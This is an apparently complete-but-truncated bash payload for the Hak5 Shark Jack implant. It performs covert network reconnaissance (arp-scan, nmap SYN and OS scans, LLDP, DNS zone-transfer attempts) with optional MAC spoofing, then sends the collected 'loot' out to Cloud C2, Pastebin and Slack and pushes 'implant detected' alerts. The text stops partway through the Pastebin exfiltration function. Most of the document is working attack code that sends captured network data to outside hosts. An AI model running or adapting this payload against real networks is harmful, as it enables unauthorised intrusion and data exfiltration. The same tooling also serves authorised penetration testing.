#!/bin/bash
#
# Title:		payload.sh   
# Description:		Swiss knife network reconnaissance payload with options for loot capturing (e.g. DIG, NMAP, IFCONFIG, ARP-SCAN, LLDP),
#			notification (e.g. Homey, Pushover (the best push notfications service!), Slack), exfiltration (e.g. Cloud C2, Pastebin,
#			Slack) and led blinking for IP address. Payload is based on various sample payloads from HAK5, MonsieurMarc, Topknot and
#			others.
#			The script has been created in a modular fashion which allows easy extending the script with new functions (e.g. recon,
#			notification or exfiltration functions). The script furthermore incorporates logic to determine already existing loot
#			folders and create a new (unique) loot folder every time the script is executed.
# Author:		Robert Coemans (robert[at]brainstoday.com)
# Version:		1.0 (19-08-2020), initial version
#			1.1 (21-08-2020), added Stealth Mode and fixed LLDP attack function
# Category:		Recon
#
# Dependencies: this payload requires you to have the following packages already installed and configured via 'opkg install' (do 'opkg update' first):
# - curl		= E.g. to grab external IP address and to post notifications
# - lldpd
# - bind-dig
# - bind-host
# - nano		= Just to have a convenient text editor available on the SharkJack
# - libustream-openssl 	= Needed for ssl (https) e.g. curl
#
# LED indications (https://docs.hak5.org/hc/en-us/articles/360010554653-LED)
# - Booting up		= Green blinking
# - Setting up		= Magenta solid [LED SETUP]
# - Failures		= Red slow blinking [LED FAIL]
# - Getting loot	= Yellow single blink [LED ATTACK]
# - Exfiltrating loot	= Yellow double blink [LED STAGE2]
# - Blink IP ADDRESS	= White blinking (fast blinking = value count, if one of the octets is zero this will be represented as solid for 1 second, long blink = next digit)
# - Finished		= Green very fast blinking followed by solid [LED FINISH]
#
# For setting up Slack (exfiltration and notification) check this tutorial: https://dev.to/c0d3b0t/upload-and-publish-a-file-on-slack-channel-with-bash-i2e
#
# ARP-SCAN is using files /usr/share/arp-scan/ieee-iab.txt, /usr/share/arp-scan/ieee-oui.txt and /usr/share/arp-scan/mac-vendor.txt to retrieve vendors based on discovered MAC addresses
#
# Nmap examples (see nmap --help for options)
# - "-sP --host-timeout 30s --max-retries 3"	Ping scans the network, listening to hosts that respond tp ping for fast host discovery, a given timeout of 30 seconds and a maximum retries of 3
# - "-p 1-65535 -sV -sS -T4"			Full TCP port scan using with service version detection
# - "-v -sS -A -T4"				Prints verbose output, runs stealth syn scan, T4 timing, OS and version detection + traceroute and scripts against target services
# - "--top-ports 20"				Scan 20 most common ports
# - "-Pn"					No ping
# - "-O"					Enable OS detection
# - "-A"					Enable OS detection, version detection, script scanning and traceroute

# ****************************************************************************************************
# Configuration
# ****************************************************************************************************

# Setup toggles
STEALTH_MODE=false
CHANGE_HOSTNAME=false
CHANGE_MAC_ADDRESS=false
LOOKUP_SUBNET=true
COPY_BACK_DHCP_RETRIEVED_DNS_SERVERS=true
USE_CUSTOM_DNS_SERVER=false
START_SSH_SERVER=false
CHECK_DEFAULT_GATEWAY=true
CHECK_INTERNET_ACCESS=true
GET_EXTERNAL_IP_ADDRESS=true
NOTIFY_HOMEY=false
NOTIFY_PUSHOVER=true
NOTIFY_SLACK=false				# Need chat:write permissions in app settings!
START_CLOUD_C2_CLIENT=true

# Attack toggles
GRAB_IFCONFIG_LOOT=true
GRAB_TRACEROUTE_LOOT=true
GRAB_DNS_INFORMATION_LOOT=true
GRAB_PUBLIC_IP_WHOIS_LOOT=true
GRAB_LLDP_LOOT=true
GRAP_ARP_SCAN_LOOT=true
GRAB_NMAP_LOOT=true
GRAB_NMAP_INTERESTING_HOSTS_LOOT=false
GRAB_DIG_LOOT=true
TRY_TO_GET_INTERNAL_DOMAINS=true

# Finish toggles
EXFIL_TO_CLOUD_C2=false
EXFIL_TO_PASTEBIN=false				# Please note the API limitations: guests can create up to 10 new pastes per 24 hours, IP's that make too many requests will be blocked!
EXFIL_TO_SLACK=false				# Need files:write permissions in app settings!
BLINK_INTERNAL_IP_ADDRESS=false
HALT_SYSTEM_WHEN_DONE=false

# Setup variables
LOOT_DIR_ROOT="/root/loot/network-recon"
TODAY=$(date +%Y%m%d)
START_TIME=$(date)
BATTERY_STATUS=$(BATTERY)
HOSTNAME="shark"
MAC_ADDRESS="4a:3f:6d:db:ba:d8"
CUSTOM_NAME_SERVER="192.168.10.1"
RESOLV_CONF_FILE="/etc/resolv.conf"
RESOLV_CONF_AUTO_FILE="/tmp/resolv.conf.auto"
RESOLV_CONF_TMP_FILE="/tmp/resolv.conf"
INTERNET_TEST_HOST="http://www.google.com"
PUBLIC_IP_URL="http://icanhazip.com"
CLOUD_C2_PROVISION="/etc/device.config"

# Attack variables
TRACEROUTE_HOST="8.8.8.8"
INTERNAL_DOMAINS="mydomain.local"
BANDWIDTH_FOR_ARP_SCAN="100000"
NMAP_OPTIONS_ACTIVE_HOSTS="--top-ports 20"
INTERESTING_HOSTS_PATTERN="Synology|QNAP"
NMAP_OPTIONS_INTERESTING_HOSTS="-v -sS -A -T4"

# Exfiltrate and notification variables
HOMEY_WEBHOOK_URL="https://{your-homey-id}.connect.athom.com/api/manager/logic/webhook/{your-endpoint}"
PUSHOVER_API_POST_URL="https://api.pushover.net/1/messages.json"
PUSHOVER_APPLICATION_TOKEN="{your-application-token}"
PUSHOVER_USER_TOKEN="{your-user-token}"
PUSHOVER_PRIORITY="1"				# send as -2 to generate no notification/alert, -1 to always send as a quiet notification or 1 to display as high-priority and bypass the user's quiet hours!
PUSHOVER_DEVICE="{your-device}"			# Multiple devices may be separated by a comma!
PASTEBIN_API_LOGIN_URL="https://pastebin.com/api/api_login.php"
PASTEBIN_API_POST_URL="https://pastebin.com/api/api_post.php"
PASTEBIN_API_USER="{username}"
PASTEBIN_API_PASSWORD="{password}"
PASTEBIN_API_KEY="{your-api-key}"
PASTEBIN_EXPIRE_DATE="1W"			# N = Never, 10M = 10 Minutes, 1H = 1 Hour, 1D = 1 Day, 1W = 1 Week, 2W = 2 Weeks, 1M = 1 Month, 6M = 6 Months, 1Y = 1 Year!
SLACK_API_POST_URL="https://slack.com/api/chat.postMessage"
SLACK_API_UPLOAD_URL="https://slack.com/api/files.upload"
SLACK_OAUTH_TOKEN="{your-oauth-token}"
SLACK_CHANNEL_ID="{your-channel-id}"			# Use Slack web app to capture channel ID (last bit of URL)!
SLACK_USER="{your-slack-user}"

# ****************************************************************************************************
# Setup functions
# ****************************************************************************************************

function CREATE_SCAN_FOLDER() {
	if [ ! -d $LOOT_DIR_ROOT ]; then
		mkdir -p $LOOT_DIR_ROOT > /dev/null
	fi
	if [ "ls $LOOT_DIR_ROOT -l | grep "^d" | wc -l" = "0" ]; then
		SCAN_COUNT=1
	else
		SCAN_COUNT=$(ls $LOOT_DIR_ROOT -l | grep "^d" | awk {'print $9'} | sort -n | awk 'END{print}' | awk -F'-' '{print $1}')
		((SCAN_COUNT++))
	fi
	LOOT_DIR=$LOOT_DIR_ROOT/$SCAN_COUNT-$TODAY
	mkdir $LOOT_DIR > /dev/null	
	return
}

function INITIALIZE_LOG_FILE() {
	LOG_FILE=$LOOT_DIR/network-recon.log
	touch $LOG_FILE
	echo "****************************************************************************************************" >> $LOG_FILE
	echo "Payload executed at: $START_TIME" >> $LOG_FILE
	echo "SharkJack battery status: $BATTERY_STATUS" >> $LOG_FILE
	echo "****************************************************************************************************" >> $LOG_FILE
	echo >> $LOG_FILE
	echo "Free diskspace before actions: $(df -h | grep overlayfs | awk {'print $4'})" >> $LOG_FILE
	echo "Loot directory has been created: $LOOT_DIR" >> $LOG_FILE
	return
}

function SET_NETMODE() {
	NETMODE DHCP_CLIENT
	echo "NETMODE has been set to DHCP_CLIENT" >> $LOG_FILE
	# Wait for an IP address to be obtained
	while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done
	INTERNAL_IP=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" )
	echo "Internal (private) IP address is $INTERNAL_IP" >> $LOG_FILE
	return
}

function CHANGE_HOSTNAME() {
	if [ "$CHANGE_HOSTNAME" = "true" ]; then
		uci set system.@system[0].hostname=$HOSTNAME
		uci commit system
		/etc/init.d/system reload
		echo "HOSTNAME has been set to: $HOSTNAME" >> $LOG_FILE
	else
		HOSTNAME=$(cat /proc/sys/kernel/hostname)
		echo "HOSTNAME has been set to: $HOSTNAME" >> $LOG_FILE
	fi
	return
}

function CHANGE_MAC_ADDRESS() {
	if [ "$CHANGE_MAC_ADDRESS" = "true" ]; then
		ifconfig eth0 down
		ifconfig eth0 hw ether $MAC_ADDRESS
		ifconfig eth0 up
		while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done
		echo "MAC ADDRESS has been set to: $MAC_ADDRESS" >> $LOG_FILE
		INTERNAL_IP=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" )
		echo "New IP address has been obtained due to MAC ADDRESS change: $INTERNAL_IP" >> $LOG_FILE
	else
		MAC_ADDRESS=$(ifconfig | grep eth0 | awk {'print $5'})
		echo "MAC ADDRESS has been randomized to: $MAC_ADDRESS" >> $LOG_FILE
	fi
	return
}

function LOOKUP_SUBNET () {
	if [ "$LOOKUP_SUBNET" = "true" ]; then
		SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
		echo "Subnet $SUBNET has been looked up" >> $LOG_FILE
	fi
	return
}

function COPY_BACK_DHCP_RETRIEVED_DNS_SERVERS() {
	if [ "$COPY_BACK_DHCP_RETRIEVED_DNS_SERVERS" = "true" ]; then
		RESOLV_CONF_AUTO_CONTENTS=$(cat $RESOLV_CONF_AUTO_FILE | awk {'print tolower($0)'} | awk '{print}' ORS='|' | sed 's/.$//')
		RESOLV_CONF_CONTENTS=$(cat $RESOLV_CONF_FILE | awk {'print tolower($0)'} | awk '{print}' ORS='|' | sed 's/.$//')
		cp $RESOLV_CONF_AUTO_FILE $RESOLV_CONF_FILE && echo "Contents of $RESOLV_CONF_AUTO_FILE ($RESOLV_CONF_AUTO_CONTENTS) has been copied to $RESOLV_CONF_FILE ($RESOLV_CONF_CONTENTS)" >> $LOG_FILE || echo "Contents of $RESOLV_CONF_AUTO_FILE ($RESOLV_CONF_AUTO_CONTENTS) has NOT been copied to $RESOLV_CONF_FILE ($RESOLV_CONF_CONTENTS)" >> $LOG_FILE
	fi
	return
}

function USE_CUSTOM_DNS_SERVER() {
	if [ "$USE_CUSTOM_DNS_SERVER" = "true" ]; then
		echo "nameserver $CUSTOM_NAME_SERVER" > $RESOLV_CONF_FILE
		sleep 2
		RESOLV_CONF_CONTENTS=$(cat $RESOLV_CONF_FILE | awk {'print tolower($0)'} | awk '{print}' ORS='|' | sed 's/.$//')
		echo "DNS Server $CUSTOM_NAME_SERVER has been added to $RESOLV_CONF_FILE ($RESOLV_CONF_CONTENTS)" >> $LOG_FILE
	fi
	return
}

function START_SSH_SERVER() {
	if [ "$START_SSH_SERVER" = "true" ]; then
		/etc/init.d/sshd start
		sleep 2
		echo "SSH Server has been started" >> $LOG_FILE
	fi
	return
}

function CHECK_DEFAULT_GATEWAY() {
	if [ "$CHECK_DEFAULT_GATEWAY" = "true" ]; then
		DEFAULT_GATEWAY=$(ip r | grep default | cut -d ' ' -f 3)
		ping -q -w 1 -c 1 $DEFAULT_GATEWAY > /dev/null && echo "Default Gateway $DEFAULT_GATEWAY can be reached" >> $LOG_FILE || echo "Default Gateway $DEFAULT_GATEWAY cannot be reached" >> $LOG_FILE
	fi
	return
}

function CHECK_INTERNET_ACCESS() {
	if [ "$CHECK_INTERNET_ACCESS" = "true" ]; then
		wget -q --spider $INTERNET_TEST_HOST > /dev/null && echo "Internet test host $INTERNET_TEST_HOST can be reached" >> $LOG_FILE || echo "Internet test host $INTERNET_TEST_HOST cannot be reached" >> $LOG_FILE
	fi
	return
}

function GET_EXTERNAL_IP_ADDRESS() {
	if [ "$GET_EXTERNAL_IP_ADDRESS" = "true" ]; then
		wget -q --spider $PUBLIC_IP_URL > /dev/null && ( EXTERNAL_IP=$(curl $PUBLIC_IP_URL); echo "External (public) IP address is $EXTERNAL_IP" >> $LOG_FILE ) || echo "External (public) IP address cannot be discovered" >> $LOG_FILE
	fi
	return
}

function RECON_STARTED_NOTIFICATION() {
	if [ "$NOTIFY_HOMEY" = "true" ]; then
		curl -s -i -X GET $HOMEY_WEBHOOK_URL?tag="SharkJack_recon_started" > /dev/null && echo "Recon started notification has been sent to Homey" >> $LOG_FILE || echo "Recon started notification has NOT been sent to Homey as something went wrong" >> $LOG_FILE
	fi
	if [ "$NOTIFY_PUSHOVER" = "true" ]; then
		curl -s --form-string token="$PUSHOVER_APPLICATION_TOKEN" --form-string user="$PUSHOVER_USER_TOKEN" --form-string priority="$PUSHOVER_PRIORITY" --form-string device="$PUSHOVER_DEVICE" --form-string title="SharkJack implant detected on date: $(date '+%d-%m-%Y'), time: $(date '+%H:%M')  $(date '+%Z %z')" --form-string message="Loot identifier: $SCAN_COUNT-$TODAY, Internal IP address: $INTERNAL_IP, External (public) IP address: $(curl $PUBLIC_IP_URL)" $PUSHOVER_API_POST_URL > /dev/null && echo "Recon started notification has been sent to Pushover" >> $LOG_FILE || echo "Recon started notification has NOT been sent to Pushover as something went wrong" >> $LOG_FILE
	fi
	if [ "$NOTIFY_SLACK" = "true" ]; then
		curl -s -X POST -F text="SharkJack implant detected on date: $(date '+%d-%m-%Y'), time: $(date '+%H:%M') $(date '+%Z %z'). Loot identifier: $SCAN_COUNT-$TODAY, Internal IP address: $INTERNAL_IP, External (public) IP address: $(curl $PUBLIC_IP_URL)" -F channel="$SLACK_CHANNEL_ID" -F user="n$SLACK_USER" -F token="$SLACK_OAUTH_TOKEN" $SLACK_API_POST_URL > /dev/null && echo "Recon started notification has been sent to Slack" >> $LOG_FILE || echo "Recon started notification has NOT been sent to Slack as something went wrong" >> $LOG_FILE	
	fi
	return
}

function START_CLOUD_C2_CLIENT() {
	if [ "$START_CLOUD_C2_CLIENT" = "true" ]; then
		if [[ -f "$CLOUD_C2_PROVISION" ]]; then
			C2CONNECT
			while ! pgrep cc-client; do sleep 1; done
			echo "Connected to Cloud C2" >> $LOG_FILE
		else
			echo "Cloud C2 client configuration file ($CLOUD_C2_PROVISION) does not exists" >> $LOG_FILE
		fi
	fi
	return
}

# ****************************************************************************************************
# Attack functions
# ****************************************************************************************************

function GRAB_IFCONFIG_LOOT() {
	if [ "$GRAB_IFCONFIG_LOOT" = "true" ]; then
		IFCONFIG_LOOT_FILE=$LOOT_DIR/ifconfig.txt
		touch $IFCONFIG_LOOT_FILE
		echo "****************************************************************************************************" >> $IFCONFIG_LOOT_FILE
		echo "IFCONFIG output for ETH0 (ifconfig eth0)" >> $IFCONFIG_LOOT_FILE
		echo "****************************************************************************************************" >> $IFCONFIG_LOOT_FILE
		echo >> $IFCONFIG_LOOT_FILE
		ifconfig eth0 >> $IFCONFIG_LOOT_FILE
		echo "****************************************************************************************************" >> $IFCONFIG_LOOT_FILE
		echo "IP address output for ETH0 (ip addr show dev eth0)" >> $IFCONFIG_LOOT_FILE
		echo "****************************************************************************************************" >> $IFCONFIG_LOOT_FILE
		echo >> $IFCONFIG_LOOT_FILE
		ip addr show dev eth0 >> $IFCONFIG_LOOT_FILE
		echo "IFCONFIG loot has been collected" >> $LOG_FILE
	fi
	return
}

function GRAB_TRACEROUTE_LOOT() {
	if [ "$GRAB_TRACEROUTE_LOOT" = "true" ]; then
		TRACEROUTE_LOOT_FILE=$LOOT_DIR/traceroute.txt
		touch $TRACEROUTE_LOOT_FILE
		echo "****************************************************************************************************" >> $TRACEROUTE_LOOT_FILE
		echo "TRACEROUTE output for host $TRACEROUTE_HOST (traceroute $TRACEROUTE_HOST)" >> $TRACEROUTE_LOOT_FILE
		echo "****************************************************************************************************" >> $TRACEROUTE_LOOT_FILE
		echo >> $TRACEROUTE_LOOT_FILE
		traceroute $TRACEROUTE_HOST >> $TRACEROUTE_LOOT_FILE
		echo "TRACEROUTE loot has been collected" >> $LOG_FILE
	fi
	return
}

function GRAB_DNS_INFORMATION_LOOT() {
	if [ "$GRAB_DNS_INFORMATION_LOOT" = "true" ]; then
		DNS_INFORMATION_LOOT_FILE=$LOOT_DIR/dns_information.txt
		touch $DNS_INFORMATION_LOOT_FILE
		echo "****************************************************************************************************" >> $DNS_INFORMATION_LOOT_FILE
		echo "System's Domain Name System (DNS) resolver file: $RESOLV_CONF_FILE" >> $DNS_INFORMATION_LOOT_FILE
		echo "****************************************************************************************************" >> $DNS_INFORMATION_LOOT_FILE
		echo >> $DNS_INFORMATION_LOOT_FILE
		cat $RESOLV_CONF_FILE >> $DNS_INFORMATION_LOOT_FILE
		echo >> $DNS_INFORMATION_LOOT_FILE
		echo "****************************************************************************************************" >> $DNS_INFORMATION_LOOT_FILE
		echo "System's Domain Name System (DNS) resolver file: $RESOLV_CONF_AUTO_FILE" >> $DNS_INFORMATION_LOOT_FILE
		echo "****************************************************************************************************" >> $DNS_INFORMATION_LOOT_FILE
		echo >> $DNS_INFORMATION_LOOT_FILE
		cat $RESOLV_CONF_AUTO_FILE >> $DNS_INFORMATION_LOOT_FILE
		echo >> $DNS_INFORMATION_LOOT_FILE
		echo "****************************************************************************************************" >> $DNS_INFORMATION_LOOT_FILE
		echo "System's Domain Name System (DNS) resolver file: $RESOLV_CONF_TMP_FILE" >> $DNS_INFORMATION_LOOT_FILE
		echo "****************************************************************************************************" >> $DNS_INFORMATION_LOOT_FILE
		echo >> $DNS_INFORMATION_LOOT_FILE
		cat $RESOLV_CONF_TMP_FILE >> $DNS_INFORMATION_LOOT_FILE
		echo "DNS information loot has been collected" >> $LOG_FILE
	fi
	return
}

function GRAB_PUBLIC_IP_WHOIS_LOOT() {
	if [ "$GRAB_PUBLIC_IP_WHOIS_LOOT" = "true" ]; then
		PUBLIC_IP_WHOIS_LOOT_FILE=$LOOT_DIR/public_ip_whois.txt
		touch $PUBLIC_IP_WHOIS_LOOT_FILE
		EXTERNAL_IP=$(curl $PUBLIC_IP_URL)
		echo "****************************************************************************************************" >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo "NSLOOKUP $EXTERNAL_IP" >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo "****************************************************************************************************" >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo >> $PUBLIC_IP_WHOIS_LOOT_FILE
		nslookup $EXTERNAL_IP >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo "NSLOOKUP for $EXTERNAL_IP has been executed" >> $LOG_FILE
		echo "****************************************************************************************************" >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo "WHO.IS $EXTERNAL_IP" >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo "****************************************************************************************************" >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo >> $PUBLIC_IP_WHOIS_LOOT_FILE
		curl https://who.is/whois-ip/ip-address/$EXTERNAL_IP | sed -n '/<div class="col-md-12 queryResponseBodyKey"><pre>/,/<\/pre><\/div>/p' | sed 's/\(<div class="col-md-12 queryResponseBodyKey"><pre>\|<\/pre><\/div>\)//g' > /dev/null >> $PUBLIC_IP_WHOIS_LOOT_FILE
		echo "WHO.IS for $EXTERNAL_IP has been executed" >> $LOG_FILE
	fi
	return
}

function GRAB_LLDP_LOOT() {
	if [ "$GRAB_LLDP_LOOT" = "true" ]; then
		LLDP_LOOT_FILE=$LOOT_DIR/lldp.txt
		touch $LLDP_LOOT_FILE
		# Assign LLDPD to eth0 and restart the LLDPD service (without this it will fail)
		lldpd -I eth0
		sleep 5
		/etc/init.d/lldpd restart
		sleep 5
		echo "****************************************************************************************************" >> $LLDP_LOOT_FILE
		echo "LLDP neighbor details (lldpcli show neighbor details)" >> $LLDP_LOOT_FILE
		echo "****************************************************************************************************" >> $LLDP_LOOT_FILE
		echo >> $LLDP_LOOT_FILE
		lldpcli show neighbor details >> $LLDP_LOOT_FILE
		echo >> $LLDP_LOOT_FILE
		echo "****************************************************************************************************" >> $LLDP_LOOT_FILE
		echo "LLDP interfaces details (lldpcli show interfaces details)" >> $LLDP_LOOT_FILE
		echo "****************************************************************************************************" >> $LLDP_LOOT_FILE
		echo >> $LLDP_LOOT_FILE
		lldpcli show interfaces details >> $LLDP_LOOT_FILE
		echo "LLDP loot has been collected" >> $LOG_FILE
	fi
	return
}

function GRAP_ARP_SCAN_LOOT() {
	if [ "$GRAP_ARP_SCAN_LOOT" = "true" ]; then
		ARP_SCAN_LOOT_FILE=$LOOT_DIR/arp-scan.txt
		touch $ARP_SCAN_LOOT_FILE
		echo "****************************************************************************************************" >> $ARP_SCAN_LOOT_FILE
		echo "ARP-SCAN details (arp-scan --bandwidth=$BANDWIDTH_FOR_ARP_SCAN --interface=eth0)" >> $ARP_SCAN_LOOT_FILE
		echo "****************************************************************************************************" >> $ARP_SCAN_LOOT_FILE
		echo >> $ARP_SCAN_LOOT_FILE
		# arp-scan --arpspa $ -g -B $BANDWIDTH_FOR_ARP_SCAN -I eth0 $SUBNET >> $ARP_SCAN_LOOT_FILE
		#arp-scan --ignoredups --bandwidth=$BANDWIDTH_FOR_ARP_SCAN --interface=eth0 --localnet >> $ARP_SCAN_LOOT_FILE
		arp-scan --bandwidth=$BANDWIDTH_FOR_ARP_SCAN --interface=eth0 --localnet >> $ARP_SCAN_LOOT_FILE
		echo "ARP-SCAN loot has been collected" >> $LOG_FILE
	fi
	return
}

function GRAB_NMAP_LOOT() {
	if [ "$GRAB_NMAP_LOOT" = "true" ]; then
		NMAP_LOOT_FILE=$LOOT_DIR/nmap.txt
		touch $NMAP_LOOT_FILE
		#ACTIVE_HOSTS=( $(nmap $NMAP_QUICKSCAN 192.168.1.0/24 | grep "Nmap scan report for" | awk {'print $5'} | awk '{print}' ORS='\t' | sed 's/.$//') ) # Nmap ping scan output as an array of ip addresses
		ACTIVE_HOSTS=( $(arp-scan --localnet | tail -n +3 | head -n -3 | awk {'print $1'} | awk '{print}' ORS='\t' | sed 's/.$//') ) # Arp-scan output as an array of ip addresses
		echo "****************************************************************************************************" >> $NMAP_LOOT_FILE
		echo "Nmap scan ${#ACTIVE_HOSTS[@]} hosts with nmap options: \"$NMAP_OPTIONS_ACTIVE_HOSTS\"" >> $NMAP_LOOT_FILE
		echo "****************************************************************************************************" >> $NMAP_LOOT_FILE
		echo >> $NMAP_LOOT_FILE
		#nmap $NMAP_OPTIONS_ACTIVE_HOSTS ${ACTIVE_HOSTS[@]} -oN $NMAP_LOOT_FILE > /dev/null && echo "Nmap scan ${#ACTIVE_HOSTS[@]} hosts with nmap options: \"$NMAP_OPTIONS_ACTIVE_HOSTS\" executed succesfully" >> $LOG_FILE || echo "Nmap scan ${#ACTIVE_HOSTS[@]} hosts with nmap options: \"$NMAP_OPTIONS_ACTIVE_HOSTS\" failed" >> $LOG_FILE
		nmap $NMAP_OPTIONS_ACTIVE_HOSTS ${ACTIVE_HOSTS[@]} >> $NMAP_LOOT_FILE && echo "Nmap scan ${#ACTIVE_HOSTS[@]} hosts with nmap options: \"$NMAP_OPTIONS_ACTIVE_HOSTS\" executed succesfully" >> $LOG_FILE || echo "Nmap scan ${#ACTIVE_HOSTS[@]} hosts with nmap options: \"$NMAP_OPTIONS_ACTIVE_HOSTS\" failed" >> $LOG_FILE
	fi
	return
}

function GRAB_NMAP_INTERESTING_HOSTS_LOOT() {
	if [ "$GRAB_NMAP_INTERESTING_HOSTS_LOOT" = "true" ]; then
		NMAP_INTERESTING_HOSTS_LOOT_FILE=$LOOT_DIR/nmap_interesting_hosts.txt
		touch $NMAP_INTERESTING_HOSTS_LOOT_FILE
		INTERESTING_HOSTS=( $(arp-scan --localnet | egrep $INTERESTING_HOSTS_PATTERN | awk {'print $1'} | awk '{print}' ORS='\t' | sed 's/.$//') )
		INTERESTING_HOSTS+=( $(ip r | grep default | cut -d ' ' -f 3) )
		if [ "$GET_EXTERNAL_IP_ADDRESS" = "true" ]; then
			INTERESTING_HOSTS+=( $(curl -s $PUBLIC_IP_URL) )
		fi
		echo "****************************************************************************************************" >> $NMAP_INTERESTING_HOSTS_LOOT_FILE
		echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\"" >> $NMAP_INTERESTING_HOSTS_LOOT_FILE
		echo "****************************************************************************************************" >> $NMAP_INTERESTING_HOSTS_LOOT_FILE
		echo >> $NMAP_INTERESTING_HOSTS_LOOT_FILE
		#nmap $NMAP_OPTIONS_INTERESTING_HOSTS ${INTERESTING_HOSTS[@]} -oN $NMAP_INTERESTING_HOSTS_LOOT_FILE && echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" executed succesfully" >> $LOG_FILE || echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" failed" >> $LOG_FILE
		nmap $NMAP_OPTIONS_INTERESTING_HOSTS ${INTERESTING_HOSTS[@]} >> $NMAP_INTERESTING_HOSTS_LOOT_FILE && echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" executed succesfully" >> $LOG_FILE || echo "Nmap scan ${#INTERESTING_HOSTS[@]} interesting host with nmap options: \"$NMAP_OPTIONS_INTERESTING_HOSTS\" failed" >> $LOG_FILE
	fi
	return
}

function GRAB_DIG_LOOT() {
	if [ "$GRAB_DIG_LOOT" = "true" ]; then
		if [ "$TRY_TO_GET_INTERNAL_DOMAINS" = "true" ]; then
			#INTERNAL_DOMAINS=$(cat $RESOLV_CONF_FILE $RESOLV_CONF_AUTO_FILE $RESOLV_CONF_TMP_FILE | grep "search" | awk {'print $2'} | sort | uniq)
			INTERNAL_DOMAINS=$(cat $RESOLV_CONF_AUTO_FILE | grep "search" | awk {'print $2'} | sort | uniq)
			echo "Collecting DIG loot with automatically detected domain(s): $INTERNAL_DOMAINS" >> $LOG_FILE
		else
			echo "Collecting DIG loot with manually selected domain: $INTERNAL_DOMAINS" >> $LOG_FILE
		fi
		DIG_LOOT_FILE=$LOOT_DIR/dig.txt
		touch $DIG_LOOT_FILE
		for INTERNAL_DOMAIN in $INTERNAL_DOMAINS; do
			echo "****************************************************************************************************" >> $DIG_LOOT_FILE
			echo "DIG basic details (dig $INTERNAL_DOMAIN any)" >> $DIG_LOOT_FILE
			echo "****************************************************************************************************" >> $DIG_LOOT_FILE
			dig $INTERNAL_DOMAIN any >> $DIG_LOOT_FILE
			echo "****************************************************************************************************" >> $DIG_LOOT_FILE
			echo "DIG advanced details (dig -tAXFR $INTERNAL_DOMAIN any)" >> $DIG_LOOT_FILE
			echo "****************************************************************************************************" >> $DIG_LOOT_FILE
			dig -tAXFR $INTERNAL_DOMAIN any >> $DIG_LOOT_FILE
		done
		echo "DIG loot has been collected" >> $LOG_FILE
	fi
	return
}

# ****************************************************************************************************
# Finish functions
# ****************************************************************************************************

function EXFIL_TO_CLOUD_C2() {
	if [ "$EXFIL_TO_CLOUD_C2" = "true" ]; then
		if [[ $(pgrep cc-client) ]]; then
			LOOT_FILES="$LOOT_DIR/*.txt"
			for LOOT_FILE in $LOOT_FILES; do
				LOOT_FILE_DESC=${LOOT_FILE/"$LOOT_DIR/"/}
				LOOT_FILE_DESC=$SCAN_COUNT-$TODAY-${LOOT_FILE_DESC%.*}-loot
				LOOT_FILE_DESC=${LOOT_FILE_DESC^^}
				C2EXFIL STRING $LOOT_FILE $LOOT_FILE_DESC && echo "Exfiltration of $LOOT_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed" >> $LOG_FILE
			done
			LOG_FILE_DESC=$SCAN_COUNT-$TODAY-LOGFILE
			C2EXFIL STRING $LOG_FILE $LOG_FILE_DESC && echo "Exfiltration of $LOG_FILE to Cloud C2 has passed" >> $LOG_FILE || echo "Exfiltration of $LOG_FILE to Cloud C2 has failed" >> $LOG_FILE
		else
			echo "Exfiltration of $LOOT_FILE to Cloud C2 has failed, CC-CLIENT seems not to be running" >> $LOG_FILE
		fi
	fi
	return
}

function EXFIL_TO_PASTEBIN() {
	if [ "$EXFIL_TO_PASTEBIN" = "true" ]; then
		# Login to pastebin and get a login key
		PASTEBIN_LOGIN_KEY=$(echo | curl -s -d @- -d api_dev_key=$PASTEBIN_API_KEY -d api_user_name=$PASTEBIN_API_USER -d api_user_password=$PASTEBIN_API_PASSWORD $PASTEBIN_API_LOGIN_URL)
		# Upload the loot as a paste
		LOOT_FILES="$LOOT_DIR/*.txt"
		for LOOT_FILE in $LOOT_FILES; do
			LOOT_FILE_DESC=${LOOT_FILE/"$LOOT_DIR/"/}
			LOOT_FILE_DESC=$SCAN_COUNT-$TODAY-${LOOT_FILE_DESC%.*}-loot
			LOOT_FILE_DESC=${LOOT_FILE_DESC^^}
			curl -s -d api_paste_code="$(<$LOOT_FILE)" -d api_paste_name="$LOOT_FILE_DESC" -d api_paste_expire_date=$PASTEBIN_EXPIRE_DATE -d api_dev_key=$PASTEBIN_API_KEY -d api_user_key=$PASTEBIN_LOGIN_KEY -d api_option=paste -d api_paste_private=2 $PASTEBIN_API_POST_URL && echo "Exfiltration of $LOOT_FILE to Pastebin has passed" >> $LOG_FILE || echo "Exfiltration of $LOOT_FILE to Pastebin has failed" >> $LOG_FILE
			sleep 5
		done
		LOG_FILE_DESC=$SCAN_COUNT-$TODAY-LOGFILE
